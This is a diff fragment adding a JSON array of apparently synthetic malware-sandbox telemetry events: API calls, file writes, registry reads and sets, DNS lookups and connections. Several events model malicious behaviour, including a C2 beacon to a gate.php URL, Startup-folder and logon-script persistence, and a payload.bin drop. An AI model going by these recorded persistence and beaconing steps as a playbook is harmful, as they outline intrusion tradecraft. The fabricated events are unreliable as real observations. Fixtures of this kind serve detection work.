+   "entity_id": "45:1020@1760370000"
+  },
+  "api_name": "NtReadFile",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "02b4920b7192abe7e5cd9103",
+  "time": "2026-10-13T15:40:17.157Z",
+  "sequence": 127,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "CryptAcquireContextW",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "explorer.exe called CryptAcquireContextW \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 1020,
+   "name": "explorer.exe",
+   "entity_id": "45:1020@1760370000"
+  },
+  "api_name": "CryptAcquireContextW",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "0d3a3bd171ddc456a2fb3655",
+  "time": "2026-10-13T15:40:17.517Z",
+  "sequence": 128,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtCreateFile",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "svchost.exe called NtCreateFile \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 4412,
+   "name": "svchost.exe",
+   "entity_id": "45:4412@1760369000"
+  },
+  "api_name": "NtCreateFile",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "b7f52b62c6f73c293c5fb5a8",
+  "time": "2026-10-13T15:40:17.722Z",
+  "sequence": 129,
+  "lane": "file",
+  "kind": "event",
+  "category": [
+   "file"
+  ],
+  "action": "file-created",
+  "module": "capemon",
+  "dataset": "capemon.file",
+  "summary": "explorer.exe created C:\\Windows\\System32\\drivers\\etc\\hosts",
+  "severity": null,
+  "process": {
+   "pid": 1020,
+   "name": "explorer.exe",
+   "entity_id": "45:1020@1760370000"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": "C:\\Windows\\System32\\drivers\\etc\\hosts",
+  "registry_path": null
+ },
+ {
+  "id": "b94faec168d36946bedd2979",
+  "time": "2026-10-13T15:40:17.976Z",
+  "sequence": 130,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtCreateFile",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "explorer.exe called NtCreateFile \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 1020,
+   "name": "explorer.exe",
+   "entity_id": "45:1020@1760370000"
+  },
+  "api_name": "NtCreateFile",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "6ab7a57a375a651251565804",
+  "time": "2026-10-13T15:40:18.339Z",
+  "sequence": 131,
+  "lane": "network",
+  "kind": "event",
+  "category": [
+   "network"
+  ],
+  "action": "dns-query",
+  "module": "capemon",
+  "dataset": "capemon.network",
+  "summary": "cmd.exe resolved time.windows.com \u2192 192.168.150.1",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": {
+   "ip": "192.168.150.1",
+   "port": 53,
+   "domain": "time.windows.com"
+  },
+  "dns_query": "time.windows.com",
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "82636e43b373ac08c35f82f8",
+  "time": "2026-10-13T15:40:18.711Z",
+  "sequence": 132,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtReadFile",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "svchost.exe called NtReadFile \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 4412,
+   "name": "svchost.exe",
+   "entity_id": "45:4412@1760369000"
+  },
+  "api_name": "NtReadFile",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "82696844bfe08a6128d8659a",
+  "time": "2026-10-13T15:40:18.768Z",
+  "sequence": 133,
+  "lane": "network",
+  "kind": "event",
+  "category": [
+   "network"
+  ],
+  "action": "dns-query",
+  "module": "capemon",
+  "dataset": "capemon.network",
+  "summary": "benign.exe resolved c2.evil-updates.net \u2192 192.168.150.1",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": {
+   "ip": "192.168.150.1",
+   "port": 53,
+   "domain": "c2.evil-updates.net"
+  },
+  "dns_query": "c2.evil-updates.net",
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "75095b8016489b4b3fa15816",
+  "time": "2026-10-13T15:40:19.018Z",
+  "sequence": 134,
+  "lane": "file",
+  "kind": "event",
+  "category": [
+   "file"
+  ],
+  "action": "file-written",
+  "module": "capemon",
+  "dataset": "capemon.file",
+  "summary": "cmd.exe wrote C:\\Users\\Analyst\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.lnk",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": "C:\\Users\\Analyst\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.lnk",
+  "registry_path": null
+ },
+ {
+  "id": "9d54c0f6eed7d66b62f8dc6a",
+  "time": "2026-10-13T15:40:19.073Z",
+  "sequence": 135,
+  "lane": "registry",
+  "kind": "event",
+  "category": [
+   "registry"
+  ],
+  "action": "registry-value-read",
+  "module": "capemon",
+  "dataset": "capemon.registry",
+  "summary": "cmd.exe read HKLM\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": "HKLM\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid"
+ },
+ {
+  "id": "cd7fb85479a13b3f3a88f8e4",
+  "time": "2026-10-13T15:40:19.249Z",
+  "sequence": 136,
+  "lane": "registry",
+  "kind": "event",
+  "category": [
+   "registry"
+  ],
+  "action": "registry-value-read",
+  "module": "capemon",
+  "dataset": "capemon.registry",
+  "summary": "notepad.exe read HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProductName",
+  "severity": null,
+  "process": {
+   "pid": 3120,
+   "name": "notepad.exe",
+   "entity_id": "45:3120@1760370395"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProductName"
+ },
+ {
+  "id": "f39ee561020b9ff0bef2cee5",
+  "time": "2026-10-13T15:40:19.638Z",
+  "sequence": 137,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtWriteFile",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "explorer.exe called NtWriteFile \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 1020,
+   "name": "explorer.exe",
+   "entity_id": "45:1020@1760370000"
+  },
+  "api_name": "NtWriteFile",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "a2cf5f93844596b203b69014",
+  "time": "2026-10-13T15:40:19.884Z",
+  "sequence": 138,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtQueryAttributesFile",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "svchost.exe called NtQueryAttributesFile \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 4412,
+   "name": "svchost.exe",
+   "entity_id": "45:4412@1760369000"
+  },
+  "api_name": "NtQueryAttributesFile",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "51d7c77e341d7e4273382b21",
+  "time": "2026-10-13T15:40:19.967Z",
+  "sequence": 139,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtClose",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "benign.exe called NtClose \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": "NtClose",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "fb9dd66af7431b728fa67c1a",
+  "time": "2026-10-13T15:40:19.995Z",
+  "sequence": 140,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtQueryAttributesFile",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "benign.exe called NtQueryAttributesFile \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": "NtQueryAttributesFile",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "8c0b5ab4ddc727e8aa187e30",
+  "time": "2026-10-13T15:40:20.364Z",
+  "sequence": 141,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtClose",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "cmd.exe called NtClose \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": "NtClose",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "b6b35674d74bdeddc3933df5",
+  "time": "2026-10-13T15:40:20.750Z",
+  "sequence": 142,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtCreateFile",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "svchost.exe called NtCreateFile \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 4412,
+   "name": "svchost.exe",
+   "entity_id": "45:4412@1760369000"
+  },
+  "api_name": "NtCreateFile",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "82ad1b2f2558d3775aac5936",
+  "time": "2026-10-13T15:40:21.085Z",
+  "sequence": 143,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtClose",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "cmd.exe called NtClose \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": "NtClose",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "c6bbdf21300299cd28f5e311",
+  "time": "2026-10-13T15:40:21.173Z",
+  "sequence": 144,
+  "lane": "registry",
+  "kind": "event",
+  "category": [
+   "registry"
+  ],
+  "action": "registry-value-read",
+  "module": "capemon",
+  "dataset": "capemon.registry",
+  "summary": "explorer.exe read HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command\\(Default)",
+  "severity": null,
+  "process": {
+   "pid": 1020,
+   "name": "explorer.exe",
+   "entity_id": "45:1020@1760370000"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": "HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command\\(Default)"
+ },
+ {
+  "id": "1de0e8df97a8eb4e82df4658",
+  "time": "2026-10-13T15:40:21.490Z",
+  "sequence": 145,
+  "lane": "file",
+  "kind": "event",
+  "category": [
+   "file"
+  ],
+  "action": "file-written",
+  "module": "capemon",
+  "dataset": "capemon.file",
+  "summary": "benign.exe wrote C:\\Users\\Analyst\\Documents\\invoice_2026-09.docx",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": "C:\\Users\\Analyst\\Documents\\invoice_2026-09.docx",
+  "registry_path": null
+ },
+ {
+  "id": "279a86ea95e8cd87e6d183a5",
+  "time": "2026-10-13T15:40:21.824Z",
+  "sequence": 146,
+  "lane": "memory",
+  "kind": "event",
+  "category": [
+   "memory"
+  ],
+  "action": "memory-finding",
+  "module": "volatility3",
+  "dataset": "volatility3.malfind",
+  "summary": "malfind: RWX region in cmd.exe at 0x7ff6a80bb000",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "bac836eb67ad67df8a617d13",
+  "time": "2026-10-13T15:40:22.074Z",
+  "sequence": 147,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtQueryAttributesFile",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "benign.exe called NtQueryAttributesFile \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": "NtQueryAttributesFile",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "fc65baa0f3ba0fbafad64877",
+  "time": "2026-10-13T15:40:22.481Z",
+  "sequence": 148,
+  "lane": "network",
+  "kind": "event",
+  "category": [
+   "network"
+  ],
+  "action": "dns-query",
+  "module": "capemon",
+  "dataset": "capemon.network",
+  "summary": "notepad.exe resolved tartarus-selftest.example \u2192 192.168.150.1",
+  "severity": null,
+  "process": {
+   "pid": 3120,
+   "name": "notepad.exe",
+   "entity_id": "45:3120@1760370395"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": {
+   "ip": "192.168.150.1",
+   "port": 53,
+   "domain": "tartarus-selftest.example"
+  },
+  "dns_query": "tartarus-selftest.example",
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "62545ba495d6b1d2d471d6fd",
+  "time": "2026-10-13T15:40:22.705Z",
+  "sequence": 149,
+  "lane": "network",
+  "kind": "event",
+  "category": [
+   "network"
+  ],
+  "action": "connection-opened",
+  "module": "capemon",
+  "dataset": "capemon.network",
+  "summary": "cmd.exe connected to tartarus-selftest.example:8080",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": {
+   "ip": "203.0.113.26",
+   "port": 8080,
+   "domain": "tartarus-selftest.example"
+  },
+  "dns_query": null,
+  "url": "http://tartarus-selftest.example/gate.php?id=498",
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "3dc5cb0ddee1a4982f8236a7",
+  "time": "2026-10-13T15:40:22.834Z",
+  "sequence": 150,
+  "lane": "file",
+  "kind": "event",
+  "category": [
+   "file"
+  ],
+  "action": "file-written",
+  "module": "capemon",
+  "dataset": "capemon.file",
+  "summary": "cmd.exe wrote C:\\Users\\Analyst\\Documents\\budget.xlsx",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": "C:\\Users\\Analyst\\Documents\\budget.xlsx",
+  "registry_path": null
+ },
+ {
+  "id": "d16ad1f32c882665ae0915a0",
+  "time": "2026-10-13T15:40:23.028Z",
+  "sequence": 151,
+  "lane": "registry",
+  "kind": "event",
+  "category": [
+   "registry"
+  ],
+  "action": "registry-value-set",
+  "module": "capemon",
+  "dataset": "capemon.registry",
+  "summary": "benign.exe set HKCU\\Environment\\UserInitMprLogonScript",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": "HKCU\\Environment\\UserInitMprLogonScript"
+ },
+ {
+  "id": "f99b7d965dba2c984d215328",
+  "time": "2026-10-13T15:40:23.091Z",
+  "sequence": 152,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtSetInformationFile",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "benign.exe called NtSetInformationFile \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": "NtSetInformationFile",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "432fdf82b8125b8ca98b331d",
+  "time": "2026-10-13T15:40:23.403Z",
+  "sequence": 153,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtQueryAttributesFile",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "svchost.exe called NtQueryAttributesFile \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 4412,
+   "name": "svchost.exe",
+   "entity_id": "45:4412@1760369000"
+  },
+  "api_name": "NtQueryAttributesFile",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "6219886998442f2fb10cb8e4",
+  "time": "2026-10-13T15:40:23.432Z",
+  "sequence": 154,
+  "lane": "process",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "process-terminated",
+  "module": "capemon",
+  "dataset": "capemon.process",
+  "summary": "benign.exe terminated",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "d3666eb4287db4af83eb6f1a",
+  "time": "2026-10-13T15:40:23.656Z",
+  "sequence": 155,
+  "lane": "registry",
+  "kind": "event",
+  "category": [
+   "registry"
+  ],
+  "action": "registry-value-read",
+  "module": "capemon",
+  "dataset": "capemon.registry",
+  "summary": "explorer.exe read HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",
+  "severity": null,
+  "process": {
+   "pid": 1020,
+   "name": "explorer.exe",
+   "entity_id": "45:1020@1760370000"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater"
+ },
+ {
+  "id": "80c40cfabc47a154742af4eb",
+  "time": "2026-10-13T15:40:23.789Z",
+  "sequence": 156,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtClose",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "cmd.exe called NtClose \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": "NtClose",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "9696d75bfcc87bc110f9c32f",
+  "time": "2026-10-13T15:40:24.131Z",
+  "sequence": 157,
+  "lane": "network",
+  "kind": "event",
+  "category": [
+   "network"
+  ],
+  "action": "connection-opened",
+  "module": "capemon",
+  "dataset": "capemon.network",
+  "summary": "benign.exe connected to www.msftconnecttest.com:443",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": {
+   "ip": "203.0.113.48",
+   "port": 443,
+   "domain": "www.msftconnecttest.com"
+  },
+  "dns_query": null,
+  "url": "https://www.msftconnecttest.com/gate.php?id=729",
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "2b6b742d628463cbb90c754f",
+  "time": "2026-10-13T15:40:24.226Z",
+  "sequence": 158,
+  "lane": "registry",
+  "kind": "event",
+  "category": [
+   "registry"
+  ],
+  "action": "registry-value-read",
+  "module": "capemon",
+  "dataset": "capemon.registry",
+  "summary": "cmd.exe read HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater"
+ },
+ {
+  "id": "8d9b8ff22c3bb0844ad1173a",
+  "time": "2026-10-13T15:40:24.362Z",
+  "sequence": 159,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtReadFile",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "explorer.exe called NtReadFile \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 1020,
+   "name": "explorer.exe",
+   "entity_id": "45:1020@1760370000"
+  },
+  "api_name": "NtReadFile",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "8a090bb8be9df6e339ec8cee",
+  "time": "2026-10-13T15:40:24.487Z",
+  "sequence": 160,
+  "lane": "file",
+  "kind": "event",
+  "category": [
+   "file"
+  ],
+  "action": "file-written",
+  "module": "capemon",
+  "dataset": "capemon.file",
+  "summary": "cmd.exe wrote C:\\Users\\Analyst\\Desktop\\readme.txt",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": "C:\\Users\\Analyst\\Desktop\\readme.txt",
+  "registry_path": null
+ },
+ {
+  "id": "fde6cd2cf57449d01f8556bd",
+  "time": "2026-10-13T15:40:24.517Z",
+  "sequence": 161,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtCreateFile",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "svchost.exe called NtCreateFile \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 4412,
+   "name": "svchost.exe",
+   "entity_id": "45:4412@1760369000"
+  },
+  "api_name": "NtCreateFile",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "6adae6d24f7b2a6bd6b11b97",
+  "time": "2026-10-13T15:40:24.864Z",
+  "sequence": 162,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtOpenKey",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "cmd.exe called NtOpenKey \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": "NtOpenKey",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "ae57908396f7fdfad3fb58e6",
+  "time": "2026-10-13T15:40:25.156Z",
+  "sequence": 163,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtReadFile",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "cmd.exe called NtReadFile \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": "NtReadFile",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "a891825e5f58df3e2083831f",
+  "time": "2026-10-13T15:40:25.325Z",
+  "sequence": 164,
+  "lane": "process",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "process-terminated",
+  "module": "capemon",
+  "dataset": "capemon.process",
+  "summary": "benign.exe terminated",
+  "severity": null,
+  "process": {
+   "pid": 9708,
+   "name": "benign.exe",
+   "entity_id": "45:9708@1760370390"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "a329750b8298305a149cda52",
+  "time": "2026-10-13T15:40:25.353Z",
+  "sequence": 165,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtCreateFile",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "svchost.exe called NtCreateFile \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 4412,
+   "name": "svchost.exe",
+   "entity_id": "45:4412@1760369000"
+  },
+  "api_name": "NtCreateFile",
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": null
+ },
+ {
+  "id": "53f38d1185b3b7313de3080e",
+  "time": "2026-10-13T15:40:25.770Z",
+  "sequence": 166,
+  "lane": "registry",
+  "kind": "event",
+  "category": [
+   "registry"
+  ],
+  "action": "registry-key-created",
+  "module": "capemon",
+  "dataset": "capemon.registry",
+  "summary": "cmd.exe created HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProductName",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": null,
+  "registry_path": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProductName"
+ },
+ {
+  "id": "6114682d5a6bf26ae18aff16",
+  "time": "2026-10-13T15:40:25.980Z",
+  "sequence": 167,
+  "lane": "file",
+  "kind": "event",
+  "category": [
+   "file"
+  ],
+  "action": "file-written",
+  "module": "capemon",
+  "dataset": "capemon.file",
+  "summary": "cmd.exe wrote C:\\Users\\Public\\Libraries\\payload.bin",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": null,
+  "rule_name": null,
+  "rule_ruleset": null,
+  "destination": null,
+  "dns_query": null,
+  "url": null,
+  "file_path": "C:\\Users\\Public\\Libraries\\payload.bin",
+  "registry_path": null
+ },
+ {
+  "id": "1c0d72abb99af87c74e77ae3",
+  "time": "2026-10-13T15:40:26.091Z",
+  "sequence": 168,
+  "lane": "api",
+  "kind": "event",
+  "category": [
+   "process"
+  ],
+  "action": "NtClose",
+  "module": "capemon",
+  "dataset": "capemon.api",
+  "summary": "cmd.exe called NtClose \u2192 STATUS_SUCCESS",
+  "severity": null,
+  "process": {
+   "pid": 2476,
+   "name": "cmd.exe",
+   "entity_id": "45:2476@1760370391"
+  },
+  "api_name": "NtClose",
+  "rule_name": null,
